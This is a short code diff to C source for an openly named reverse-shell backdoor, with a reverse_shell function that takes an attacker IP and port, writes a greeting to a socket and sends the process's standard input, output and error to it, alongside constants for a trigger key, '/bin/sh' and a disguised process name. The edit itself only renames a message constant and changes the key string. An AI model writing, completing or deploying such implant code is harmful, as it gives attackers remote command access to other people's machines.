@@ -16,8 +16,8 @@
 #include <signal.h>
 
 #define PACKET_SIZE 	1024
-#define KEY         	"winning"
-#define MOTD        	"Ready Player One...\n"
+#define KEY         	"pwned"
+#define GREETING        "Ready Player One...\n"
 #define SHELL       	"/bin/sh"
 #define PROCESS_NAME    "reverse_shell"
 
@@ -58,7 +58,7 @@ void reverse_shell(char *attacker_ip, unsigned short int attacker_port){
         	return;
 	
 	//Print message to socket
-    	write(sockfd, MOTD, strlen(MOTD));
+    	write(sockfd, GREETING, strlen(GREETING));
 	
 	//send stdin, stdout, stderr to socket
 	int i;
